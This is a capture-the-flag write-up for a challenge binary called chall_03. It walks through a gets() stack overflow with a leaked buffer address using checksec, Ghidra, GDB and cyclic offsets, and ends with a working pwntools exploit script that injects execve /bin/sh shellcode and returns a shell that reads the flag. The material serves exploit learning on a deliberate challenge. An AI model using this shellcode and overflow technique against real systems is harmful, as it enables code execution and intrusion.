# &#35; chall_03

#### &#42; execute
```bash
## 1 file
$ ls chall_03
chall_03

$ file ./chall_03
./chall_03: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c82bd42667d69ae28ec0a4de104a0eb194b608e6, not stripped

$ checksec --file=./chall_03
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      No canary found   NX disabled   PIE enabled     No RPATH   No RUNPATH   68) Symbols	  No	0		3		./chall_03

## just do input twice and leak address
$ ./chall_03
Just in time.
AAAAAAAA
I'll make it: 0x7ffc980ee200
BBBBBBBB

```

#### &#42; disassemble using ghidra
```bash
## vulerable point is gets(local_78) in vuln() : stack overflow
void main(void)

{
  char local_28 [32];
  
  puts("Just in time.");
  fgets(local_28,19,stdin);
  vuln();
  return;
}

void vuln(void)

{
  char local_78 [112];
  
  printf("I\'ll make it: %p\n",local_78);
  gets(local_78);
  return;
}


## exploit structure
local_78[shellcode] + ... + sfp[4] + ret[addr of local_78]

```


#### &#42; analysis binary using gdb
```bash

$ gdb ./chall_03 -q
GEF for linux ready, type `gef' to start, `gef config' to configure
94 commands loaded for GDB 9.2 using Python engine 3.8
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./chall_03...
(No debugging symbols found in ./chall_03)
gef➤  disass main
Dump of assembler code for function main:
   0x000000000000078e <+0>:	push   rbp
   0x000000000000078f <+1>:	mov    rbp,rsp
   0x0000000000000792 <+4>:	sub    rsp,0x20
   0x0000000000000796 <+8>:	lea    rdi,[rip+0xc9]        # 0x866
   0x000000000000079d <+15>:	call   0x600 <puts@plt>
   0x00000000000007a2 <+20>:	mov    rdx,QWORD PTR [rip+0x200867]        # 0x201010 <stdin@@GLIBC_2.2.5>
   0x00000000000007a9 <+27>:	lea    rax,[rbp-0x20]
   0x00000000000007ad <+31>:	mov    esi,0x13
   0x00000000000007b2 <+36>:	mov    rdi,rax
   0x00000000000007b5 <+39>:	call   0x620 <fgets@plt>
   0x00000000000007ba <+44>:	call   0x75a <vuln>
   0x00000000000007bf <+49>:	nop                 => ret of vuln()
   0x00000000000007c0 <+50>:	leave
   0x00000000000007c1 <+51>:	ret
End of assembler dump.
gef➤

gef➤  disass vuln
Dump of assembler code for function vuln:
   0x000000000000075a <+0>:	push   rbp
   0x000000000000075b <+1>:	mov    rbp,rsp
   0x000000000000075e <+4>:	sub    rsp,0x70
   0x0000000000000762 <+8>:	lea    rax,[rbp-0x70]
   0x0000000000000766 <+12>:	mov    rsi,rax
   0x0000000000000769 <+15>:	lea    rdi,[rip+0xe4]        # 0x854
   0x0000000000000770 <+22>:	mov    eax,0x0
   0x0000000000000775 <+27>:	call   0x610 <printf@plt>
   0x000000000000077a <+32>:	lea    rax,[rbp-0x70]
   0x000000000000077e <+36>:	mov    rdi,rax
   0x0000000000000781 <+39>:	mov    eax,0x0
   0x0000000000000786 <+44>:	call   0x630 <gets@plt>
   0x000000000000078b <+49>:	nop
   0x000000000000078c <+50>:	leave
   0x000000000000078d <+51>:	ret
End of assembler dump.
gef➤

## need to point address of local_78 to ret using leak address.

gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x000055cdf6780000 0x000055cdf6781000 0x0000000000000000 r-x /pwn/sunshine/03/chall_03
0x000055cdf6980000 0x000055cdf6981000 0x0000000000000000 r-x /pwn/sunshine/03/chall_03
0x000055cdf6981000 0x000055cdf6982000 0x0000000000001000 rwx /pwn/sunshine/03/chall_03
0x000055cdf7e44000 0x000055cdf7e65000 0x0000000000000000 rwx [heap]
0x00007f5594e8c000 0x00007f5594eb1000 0x0000000000000000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007f5594eb1000 0x00007f5595029000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007f5595029000 0x00007f5595073000 0x000000000019d000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007f5595073000 0x00007f5595074000 0x00000000001e7000 --- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007f5595074000 0x00007f5595077000 0x00000000001e7000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007f5595077000 0x00007f559507a000 0x00000000001ea000 rwx /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007f559507a000 0x00007f5595080000 0x0000000000000000 rwx
0x00007f559508b000 0x00007f559508c000 0x0000000000000000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007f559508c000 0x00007f55950af000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007f55950af000 0x00007f55950b7000 0x0000000000024000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007f55950b8000 0x00007f55950b9000 0x000000000002c000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007f55950b9000 0x00007f55950ba000 0x000000000002d000 rwx /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007f55950ba000 0x00007f55950bb000 0x0000000000000000 rwx
0x00007ffe5627d000 0x00007ffe5629e000 0x0000000000000000 rwx [stack]      => address of local_78 in stack area
0x00007ffe563d5000 0x00007ffe563d8000 0x0000000000000000 r-- [vvar]
0x00007ffe563d8000 0x00007ffe563da000 0x0000000000000000 r-x [vdso]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤

```

#### &#42; structure of stack
```bash
buf[104] + sfp[8] + ret[8]


$ cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa


gef➤  r
Starting program: /pwn/sunshine/03/chall_03
warning: Error disabling address space randomization: Operation not permitted
Just in time.
AAAA
I'll make it: 0x7ffd3e1966a0
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.
0x00005555e878f78d in vuln ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007ffd3e1966a0  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$rbx   : 0x00005555e878f7d0  →  <__libc_csu_init+0> push r15
$rcx   : 0x00007f5a4290b980  →  0x00000000fbad2288
$rdx   : 0x0
$rsp   : 0x00007ffd3e196718  →  "faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]"
$rbp   : 0x6261616562616164 ("daabeaab"?)
$rsi   : 0x00005555ea09a6b1  →  "aaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaa[...]"
$rdi   : 0x00007f5a4290e4d0  →  0x0000000000000000
$rip   : 0x00005555e878f78d  →  <vuln+51> ret
$r8    : 0x00007ffd3e1966a0  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$r9    : 0x00007ffd3e1966d0  →  "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
$r10   : 0x00005555ea09a81f  →  0x0000000000000000
$r11   : 0x00007ffd3e196758  →  "vaabwaabxaabyaab"
$r12   : 0x00005555e878f650  →  <_start+0> xor ebp, ebp
$r13   : 0x00007ffd3e196830  →  0x0000000000000001
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffd3e196718│+0x0000: "faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]"	 ← $rsp
0x00007ffd3e196720│+0x0008: "haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]"
0x00007ffd3e196728│+0x0010: "jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]"
0x00007ffd3e196730│+0x0018: "laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]"
0x00007ffd3e196738│+0x0020: "naaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"
0x00007ffd3e196740│+0x0028: "paabqaabraabsaabtaabuaabvaabwaabxaabyaab"
0x00007ffd3e196748│+0x0030: "raabsaabtaabuaabvaabwaabxaabyaab"
0x00007ffd3e196750│+0x0038: "taabuaabvaabwaabxaabyaab"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555e878f786 <vuln+44>        call   0x5555e878f630 <gets@plt>
   0x5555e878f78b <vuln+49>        nop
   0x5555e878f78c <vuln+50>        leave
 → 0x5555e878f78d <vuln+51>        ret
[!] Cannot disassemble from $PC
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall_03", stopped 0x5555e878f78d in vuln (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555e878f78d → vuln()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤

$ cyclic -l daab
112
$ cyclic -l eaab
116


## check payload[112] + ret[8]

gef➤  r
Starting program: /pwn/sunshine/03/chall_03
warning: Error disabling address space randomization: Operation not permitted
Just in time.
AAAAAAAA
I'll make it: 0x7ffe9d006720
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCC

Program received signal SIGSEGV, Segmentation fault.
0x0000563cc23847c0 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007ffe9d006720  →  "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
$rbx   : 0x0000563cc23847d0  →  <__libc_csu_init+0> push r15
$rcx   : 0x00007f06f56be980  →  0x00000000fbad2288
$rdx   : 0x0
$rsp   : 0x00007ffe9d0067a0  →  "AAAAAAAA\n"
$rbp   : 0x434343434343
$rsi   : 0x0000563cc3b5a6b1  →  "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
$rdi   : 0x00007f06f56c14d0  →  0x0000000000000000
$rip   : 0x0000563cc23847c0  →  <main+50> leave
$r8    : 0x00007ffe9d006720  →  "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
$r9    : 0x0
$r10   : 0x0000563cc2384864  →   or al, BYTE PTR [rax]
$r11   : 0x246
$r12   : 0x0000563cc2384650  →  <_start+0> xor ebp, ebp
$r13   : 0x00007ffe9d0068b0  →  0x0000000000000001
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffe9d0067a0│+0x0000: "AAAAAAAA\n"	 ← $rsp
0x00007ffe9d0067a8│+0x0008: 0x0000563cc238000a
0x00007ffe9d0067b0│+0x0010: 0x00007ffe9d0068b0  →  0x0000000000000001
0x00007ffe9d0067b8│+0x0018: 0x0000000000000000
0x00007ffe9d0067c0│+0x0020: 0x0000000000000000
0x00007ffe9d0067c8│+0x0028: 0x00007f06f54fa0b3  →  <__libc_start_main+243> mov edi, eax
0x00007ffe9d0067d0│+0x0030: 0x00007f06f56ff620  →  0x0004137900000000
0x00007ffe9d0067d8│+0x0038: 0x00007ffe9d0068b8  →  0x00007ffe9d008878  →  "/pwn/sunshine/03/chall_03"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x563cc23847b5 <main+39>        call   0x563cc2384620 <fgets@plt>
   0x563cc23847ba <main+44>        call   0x563cc238475a <vuln>
   0x563cc23847bf <main+49>        nop
 → 0x563cc23847c0 <main+50>        leave
   0x563cc23847c1 <main+51>        ret
   0x563cc23847c2                  nop    WORD PTR cs:[rax+rax*1+0x0]
   0x563cc23847cc                  nop    DWORD PTR [rax+0x0]
   0x563cc23847d0 <__libc_csu_init+0> push   r15
   0x563cc23847d2 <__libc_csu_init+2> push   r14
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall_03", stopped 0x563cc23847c0 in main (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x563cc23847c0 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤


```

#### &#42; payload(python)
```python
payload  = shellcode
payload += "A"*(112-len(payload))
payload += p64(local_78)

```


#### &#42; make exploit code
```python
$ cat exp.py
from pwn import *

filename = 'chall_03'
conn = process(filename)

print( conn.recvuntil("Just in time.\n") )

payload  = b"Z"*8
conn.sendline(payload)

with open("payload", "wb") as fd:
    fd.write(payload+"\n")

print( conn.recvuntil("it: ") )

#recv_addr = u64(conn.recv(14))
ret = (int(conn.recv(14),16))
print( "ret = " +hex(ret) )


shellcode = b"\x31\xc0\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
#payload  = "\x90"*80   # nop(\x90) sled not work
payload = shellcode
payload += b"B"*(120-len(payload))
payload += p64(ret)

conn.sendline(payload)


with open("payload", "ab") as fd:
    fd.write(payload)

conn.interactive()


```


#### &#42; try to exploit
```bash
$ python2 exp.py
[!] Could not find executable 'chall_03' in $PATH, using './chall_03' instead
[+] Starting local process './chall_03': pid 2761
Just in time.

I'll make it:
ret = 0x7ffd7ea30700
[*] Switching to interactive mode

$
$ cat flag.txt
sun{a-little-piece-of-heaven-26c8795afe7b3c49}
$

```